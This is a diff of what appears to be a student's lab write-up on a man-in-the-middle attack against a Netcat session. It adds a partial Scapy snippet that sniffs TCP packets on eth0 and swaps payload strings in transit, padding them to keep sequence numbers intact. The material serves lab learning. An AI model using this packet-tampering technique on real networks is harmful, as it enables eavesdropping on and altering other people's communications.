@@ -162,5 +162,19 @@ f = f'tcp and not ether src {M_MAC}'                            # Avoid capturin
 sniff(iface='eth0', filter=f, prn=spoof_pkt)                    # Listen on eth0
 ```
 ## Step 5: AiM Attack on Netcat
-Similarly to Task 2 Netcat Packets from A to B will be intercepted and modifyed by M, the script is the same as before, it is needed to keep the same pkt lenght in order to have the same sequence number, i archieved this by adding the right amount of spaces.
+Similarly to Task 2 Netcat Packets from A to B will be intercepted and modifyed by M, the script is the same as before exept for the payload sobstitution:<br>
+```py
+...
+olddata1 = b"Gabriele"
+newdata1 = b"AAAAAAAA"
+olddata2 = b"Gabdalf: Mi raccomando Frodo, porta l'anello al Monte Fato!"
+newdata2 = b"Gabdalf: Mi raccomando Frodo, porta l'anello a Sauron!     "
+del(newpkt[TCP].payload)                            # Drop old payload
+if olddata1 in payload:
+    newdata = payload.replace(olddata1, newdata1)
+elif olddata2 in payload:
+    newdata = payload.replace(olddata2, newdata2)
+...
+```<br>
+It is needed to keep the same pkt lenght in order to have the same sequence number, i archieved this by adding the right amount of spaces.
 ![](task3.png)
